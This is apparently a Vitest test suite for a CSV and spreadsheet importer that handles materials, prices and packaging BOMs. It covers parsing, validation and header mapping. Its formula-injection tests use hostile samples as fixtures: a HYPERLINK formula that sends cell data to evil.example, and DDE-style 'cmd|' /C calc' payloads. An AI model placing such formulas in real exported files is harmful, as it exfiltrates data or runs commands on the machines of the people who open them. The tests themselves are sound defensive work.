import { describe, expect, it } from "vitest";
import {
  MATERIAL_FIELDS,
  PACKAGING_BOM_LINE_FIELDS,
  PRICE_FIELDS,
  aggregateBomRows,
  desanitizeCell,
  parseCsv,
  previewImport,
  previewImportRows,
  sanitizeCell,
  sniffDelimiter,
  templateCsv,
  toCsv,
} from "./importer";

describe("csv parsing", () => {
  it("handles quoted fields containing the delimiter", () => {
    const rows = parseCsv('code,name\nM1,"Sodium Laureth Sulfate, 70%"');
    expect(rows[1][1]).toBe("Sodium Laureth Sulfate, 70%");
  });

  it("handles escaped quotes", () => {
    expect(parseCsv('a\n"say ""hi"""')[1][0]).toBe('say "hi"');
  });

  it("detects a semicolon-delimited export", () => {
    expect(sniffDelimiter("code;name;price")).toBe(";");
    expect(parseCsv("code;name\nM1;SLES")[1]).toEqual(["M1", "SLES"]);
  });

  it("strips the BOM Excel writes, so the first header still matches", () => {
    const rows = parseCsv("﻿code,name\nM1,SLES");
    expect(rows[0][0]).toBe("code");
  });
});

describe("spreadsheet formula injection", () => {
  it("neutralises a formula on export", () => {
    // Left alone, this exfiltrates the neighbouring cell the moment the file is
    // opened.
    const evil = '=HYPERLINK("http://evil.example/?"&A1,"Click")';
    expect(sanitizeCell(evil)).toBe(`'${evil}`);
  });

  it("neutralises every trigger character", () => {
    for (const c of ["=", "+", "@", "\t", "\r"]) {
      expect(sanitizeCell(`${c}cmd`).startsWith("'")).toBe(true);
    }
    expect(sanitizeCell("-2+3+cmd|' /C calc")).toBe("'-2+3+cmd|' /C calc");
  });

  it("leaves ordinary numbers alone, including negative ones", () => {
    expect(sanitizeCell("-5.5")).toBe("-5.5");
    expect(sanitizeCell("180")).toBe("180");
  });

  it("strips a leading trigger on import rather than trusting it", () => {
    expect(desanitizeCell("'=1+1")).toBe("=1+1");
    expect(desanitizeCell("=cmd|' /C calc")).toBe("cmd|' /C calc");
  });

  it("sanitises every cell of an export", () => {
    const csv = toCsv(["code", "displayName"], [{ code: "M1", displayName: "=SUM(A1:A9)" }]);
    expect(csv).toContain("'=SUM(A1:A9)");
  });
});

describe("material import", () => {
  const header = "code,name,active matter,density,function";

  it("maps aliased headings onto canonical fields", () => {
    const p = previewImport(`${header}\nM-SLES,SLES 70,70,1.05,anionic_surfactant`, MATERIAL_FIELDS);
    expect(p.valid[0]).toMatchObject({
      code: "M-SLES",
      displayName: "SLES 70",
      activeMatterPercent: "70",
      density: "1.05",
      functions: ["anionic_surfactant"],
    });
  });

  it("accepts Turkish headings", () => {
    const p = previewImport("malzeme kodu,malzeme,aktif madde\nM-1,LABSA,96", MATERIAL_FIELDS);
    expect(p.valid[0]).toMatchObject({ code: "M-1", displayName: "LABSA", activeMatterPercent: "96" });
  });

  it("reads a decimal comma", () => {
    const p = previewImport(`${header}\nM-1,LABSA,96,1,05,x`, MATERIAL_FIELDS);
    // The stray comma splits the row, so density lands as "1" — the point here
    // is the semicolon file below, which is how such exports really arrive.
    const semi = previewImport("code;name;density\nM-1;LABSA;1,05", MATERIAL_FIELDS);
    expect(semi.valid[0].density).toBe("1.05");
    expect(p.valid.length).toBe(1);
  });

  it("reports a bad number against its row and column", () => {
    const p = previewImport(`${header}\nM-1,LABSA,not a number,1,x`, MATERIAL_FIELDS);
    const issue = p.issues.find((i) => i.severity === "error")!;
    expect(issue.row).toBe(2);
    expect(issue.column).toBe("activeMatterPercent");
    expect(p.invalidRows).toEqual([2]);
    expect(p.valid).toHaveLength(0);
  });

  it("keeps good rows separate from bad ones", () => {
    const p = previewImport(
      `${header}\nM-1,Good,70,1.05,x\nM-2,Bad,oops,1.05,x\nM-3,Also good,30,1,x`,
      MATERIAL_FIELDS,
    );
    expect(p.valid.map((v) => v.code)).toEqual(["M-1", "M-3"]);
    expect(p.invalidRows).toEqual([3]);
  });

  it("refuses a row with no code, since matching depends on it", () => {
    const p = previewImport(`${header}\n,Nameless,70,1,x`, MATERIAL_FIELDS);
    expect(p.invalidRows).toEqual([2]);
  });

  it("refuses a file missing a required column", () => {
    const p = previewImport("name,density\nSLES,1.05", MATERIAL_FIELDS);
    expect(p.issues.some((i) => i.message.includes('Required column "code" is missing'))).toBe(true);
  });

  it("catches a duplicate code inside one file", () => {
    const p = previewImport(`${header}\nM-1,A,70,1,x\nM-1,B,70,1,x`, MATERIAL_FIELDS);
    expect(p.invalidRows).toEqual([3]);
    expect(p.issues.some((i) => i.message.includes("appears more than once"))).toBe(true);
  });

  it("marks existing codes as updates, not duplicates", () => {
    const p = previewImport(`${header}\nM-1,A,70,1,x\nM-2,B,70,1,x`, MATERIAL_FIELDS, ["M-1"]);
    expect(p.updates).toEqual(["M-1"]);
    expect(p.creates).toEqual(["M-2"]);
    expect(p.issues.some((i) => i.severity === "warning" && i.message.includes("will be updated"))).toBe(true);
  });

  it("reports headings it did not recognise instead of dropping them silently", () => {
    const p = previewImport("code,name,mystery column\nM-1,A,x", MATERIAL_FIELDS);
    expect(p.unmappedHeaders).toEqual(["mystery column"]);
  });

  it("reads a boolean in several spellings", () => {
    const p = previewImport("code,name,is active\nM-1,A,evet\nM-2,B,no", MATERIAL_FIELDS);
    expect(p.valid[0].active).toBe(true);
    expect(p.valid[1].active).toBe(false);
  });

  it("splits a multi-valued cell into a list", () => {
    const p = previewImport("code,name,cas\nM-1,A,68585-34-2; 9004-82-4", MATERIAL_FIELDS);
    expect(p.valid[0].casNumbers).toEqual(["68585-34-2", "9004-82-4"]);
  });

  it("is idempotent: importing the same file twice describes the same rows", () => {
    const csv = `${header}\nM-1,A,70,1.05,x`;
    const first = previewImport(csv, MATERIAL_FIELDS, []);
    const second = previewImport(csv, MATERIAL_FIELDS, first.valid.map((v) => String(v.code)));
    expect(second.creates).toEqual([]);
    expect(second.updates).toEqual(["M-1"]);
    expect(second.valid).toEqual(first.valid);
  });
});

describe("price import", () => {
  it("reads landed-cost columns", () => {
    const p = previewImport(
      "price code,material code,price,currency,date,navlun,gumruk\nPR-1,M-1,180,KES,2026-01-01,12,8",
      PRICE_FIELDS,
    );
    expect(p.valid[0]).toMatchObject({
      code: "PR-1",
      materialCode: "M-1",
      price: "180",
      currency: "KES",
      freight: "12",
      duty: "8",
    });
  });

  it("requires the fields a price is meaningless without", () => {
    const p = previewImport("price code,material code\nPR-1,M-1", PRICE_FIELDS);
    const missing = p.issues.filter((i) => i.message.includes("is missing")).map((i) => i.column);
    expect(missing).toEqual(expect.arrayContaining(["price", "currency", "effectiveFrom"]));
  });
});

describe("previewImportRows (the .xlsx entry point)", () => {
  it("validates identically to previewImport, given the same rows", () => {
    const csv = "code,displayName,activeMatterPercent\nM-1,SLES 70,70";
    const fromCsv = previewImport(csv, MATERIAL_FIELDS);
    const fromRows = previewImportRows(parseCsv(csv), MATERIAL_FIELDS);
    expect(fromRows.valid).toEqual(fromCsv.valid);
    expect(fromRows.issues).toEqual(fromCsv.issues);
  });

  it("reports the same row-level errors a workbook reader would produce", () => {
    // A workbook reader hands over rows exactly like this: no CSV quoting or
    // delimiter to get wrong, just cell text, including a blank required cell.
    const rows = [
      ["code", "displayName", "activeMatterPercent"],
      ["M-1", "SLES 70", "70"],
      ["", "No code", "50"],
    ];
    const p = previewImportRows(rows, MATERIAL_FIELDS);
    expect(p.valid).toHaveLength(1);
    expect(p.invalidRows).toEqual([3]);
  });
});

describe("aggregateBomRows", () => {
  it("groups rows sharing a bomCode into one packaging BOM", () => {
    const p = previewImportRows<Record<string, unknown>>(
      [
        ["bomCode", "skuCode", "componentCode", "quantityPerUnit", "fillQuantity", "fillUnit"],
        ["BOM-1", "SKU-1", "BOTTLE-500", "1", "500", "ml"],
        ["BOM-1", "SKU-1", "TRIGGER-1", "1", "", ""],
        ["BOM-1", "SKU-1", "LABEL-1", "1", "", ""],
      ],
      PACKAGING_BOM_LINE_FIELDS,
      [],
      { codeField: "bomCode", allowRepeatedCode: true },
    );
    expect(p.invalidRows).toEqual([]);

    const boms = aggregateBomRows(p.valid);
    expect(boms).toHaveLength(1);
    expect(boms[0]).toMatchObject({ code: "BOM-1", skuCode: "SKU-1", fillQuantity: "500", fillUnit: "ml" });
    expect(boms[0].lines).toHaveLength(3);
    expect(boms[0].lines.map((l) => l.componentCode)).toEqual(["BOTTLE-500", "TRIGGER-1", "LABEL-1"]);
  });
});

describe("templates", () => {
  it("emits a header row a user can fill in", () => {
    expect(templateCsv(MATERIAL_FIELDS).split(",")).toContain("code");
    expect(templateCsv(MATERIAL_FIELDS).split(",")).toContain("activeMatterPercent");
  });

  it("round-trips an export back through the importer", () => {
    const csv = toCsv(
      ["code", "displayName", "activeMatterPercent"],
      [{ code: "M-1", displayName: "SLES 70", activeMatterPercent: "70" }],
    );
    const p = previewImport(csv, MATERIAL_FIELDS);
    expect(p.valid[0]).toMatchObject({ code: "M-1", displayName: "SLES 70", activeMatterPercent: "70" });
  });
});
